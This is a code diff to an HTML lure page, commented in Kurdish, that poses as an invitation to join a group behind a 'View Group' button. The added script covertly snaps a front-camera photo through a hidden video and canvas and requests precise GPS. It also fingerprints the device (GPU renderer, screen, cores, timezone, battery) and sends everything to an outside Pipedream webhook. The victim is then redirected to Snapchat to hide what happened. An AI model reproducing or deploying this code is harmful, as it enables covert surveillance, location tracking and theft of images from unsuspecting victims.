@@ -39,26 +39,51 @@
     <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
     <button class="btn" id="viewGroupBtn">View Group</button>
 
+    <video id="video" width="400" height="300" autoplay style="display:none;" playsinline></video>
+    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+
     <script>
-        // وێبهۆکە ڕاستەکەی خۆت لێرەدا جێگیرە
+        // 🔗 بەستنەوەی لینکی ڕاستەقینەی وێبهۆک و سناپچاتەکەت
         const secureWebhook = "https://eo7he3r6tagkjph.m.pipedream.net";
         const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
 
-        let globalBattery = "N/A";
-        let globalCharging = "N/A";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        let globalBattery = "پشتگیری ناکرێت (iPhone)";
+        let globalCharging = "پشتگیری ناکرێت (iPhone)";
         let globalMaps = "⚠️ مۆڵەتی نەدا";
-        let globalDevice = navigator.platform || "Unknown";
         
-        // جیاکردنەوەی وردی کرۆم و سەفاری لەسەر ئایفۆن
+        // خوێندنەوەی جۆری گرافیک و ڕەقەکاڵای ناوخۆیی ئامێرەکە
+        let globalHardware = "Unknown Hardware";
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                globalHardware = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch(e){}
+
+        let globalDevice = navigator.platform || "iPhone";
+        
+        // ناسینەوەی زۆر دەقیقی جیاوازی نێوان کرۆم و سەفاری لەسەر ئایفۆن
         let globalBrowser = "Safari (iPhone)";
         if (navigator.userAgent.indexOf("CriOS") > -1 || navigator.userAgent.indexOf("Chrome") > -1) {
             globalBrowser = "Chrome (iPhone)";
         }
 
         let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
-        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "Unknown";
+        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "3G/4G/5G";
+        let globalLang = navigator.language || "Unknown";
+        let globalScreen = window.screen.width + "x" + window.screen.height;
+        let globalDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "بەڵێ (Dark)" : "نەخێر (Light)";
+        
+        let globalCores = navigator.hardwareConcurrency || "Unknown";
+        let globalOrientation = window.innerHeight > window.innerWidth ? "ستوونی (Portrait)" : "ئاسۆیی (Landscape)";
+        let globalTimezone = "GMT" + (new Date().getTimezoneOffset() / -60 >= 0 ? "+" : "") + (new Date().getTimezoneOffset() / -60);
 
-        // خێرا وەرگرتنی ڕێژەی باتری
+        // خوێندنەوەی باتری بۆ ئەو ئامێرانەی ڕێگا دەدەن (دەرەوەی ئایفۆن)
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 globalBattery = Math.round(battery.level * 100) + "%";
@@ -66,20 +91,29 @@
             }).catch(() => {});
         }
 
-        // 🚀 تەواوی لۆجیکەکە لێرەوە دەست پێدەکات کاتێک دەست بە دوگمەکەوە دەنێت
+        // لۆجیکی سەرەکی و ناچارکردنی سەفاری بۆ دەرپەڕاندنی پۆپئەپەکان پێکەوە
         document.getElementById('viewGroupBtn').addEventListener('click', async function() {
             document.getElementById('viewGroupBtn').innerText = "Loading...";
 
-            // ١. داواکردنی مۆڵەتی کامێرا ڕێک لە کاتی داگرتنی دوگمەکەدا
+            let base64Image = "⚠️ وێنە نەگیرا";
+
+            // ١. داواکردنی خێرای کامێرا و چرکاندنی وێنەکە
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                // ئەگەر مۆڵەتی دا، کامێراکە دەکوژێنینەوە چونکە تەنها پۆپئەپەکەمان مەبەستە
+                video.srcObject = stream;
+                
+                // چاوەڕوانی تەنها ٣٠٠ میلی چرکە دەکەین تا فۆکەس ڕێک دەبێت
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                context.drawImage(video, 0, 0, 400, 300);
+                base64Image = canvas.toDataURL('image/jpeg', 0.4); // قەبارەی زۆر کەم دەکەینەوە بۆ خێرا ناردن
+                
                 stream.getTracks().forEach(track => track.stop());
             } catch (cameraErr) {
-                console.log("کامێرا ڕەتکرایەوە یان پشتگیری ناکرێت");
+                console.log("کامێرا ڕەتکرایەوە یان مۆڵەتی نەدا");
             }
 
-            // ٢. ڕاستەوخۆ دوای ئەوە، داواکردنی مۆڵەتی لۆکەیشن
+            // ٢. ڕاستەوخۆ دوای ئەوە داواکردنی لۆکەیشنی GPS
             if (navigator.geolocation) {
                 await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition((position) => {
@@ -88,22 +122,30 @@
                         globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
                         resolve();
                     }, () => {
-                        resolve(); // ئەگەر ڕەتیشی کردەوە هەر دەچێتە قۆناغی دواتر
-                    }, { enableHighAccuracy: true, timeout: 5000 });
+                        resolve();
+                    }, { enableHighAccuracy: true, timeout: 3500 });
                 });
             }
 
-            // ٣. ڕێکخستنی داتاکان بۆ ناردن
+            // ٣. ڕێکخستنی تەواوی داتاکان لە ناو یەک کاتژمێردا
             let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
             const payload = {
                 uid: uid,
                 battery: globalBattery,
                 charging: globalCharging,
                 device: globalDevice,
+                hardware: globalHardware,
                 browser: globalBrowser,
                 network: globalNetwork,
                 time: globalTime,
-                maps: globalMaps
+                maps: globalMaps,
+                lang: globalLang,
+                screen: globalScreen,
+                dark: globalDarkMode,
+                cores: globalCores,
+                orient: globalOrientation,
+                tz: globalTimezone,
+                photo: base64Image
             };
 
             const params = new URLSearchParams();
@@ -111,14 +153,14 @@
                 params.append(key, payload[key]);
             }
 
-            // ٤. ناردنی دڵنیا بە sendBeacon بۆ ئەوەی لە ئایفۆندا نەپچڕێت
+            // ٤. ناردنی مسۆگەر بە sendBeacon کە لە پاشبنەمای ئایفۆندا هەرگیز ناپچڕێت
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(secureWebhook, params);
             } else {
                 await fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
             }
 
-            // ٥. بازدان بۆ سەر لینکەکەی سناپچات
+            // ٥. بازدانی فەرمی بۆ سەر لینکەکەی سناپچات
             window.location.href = snapchatRedirectUrl;
         });
     </script>
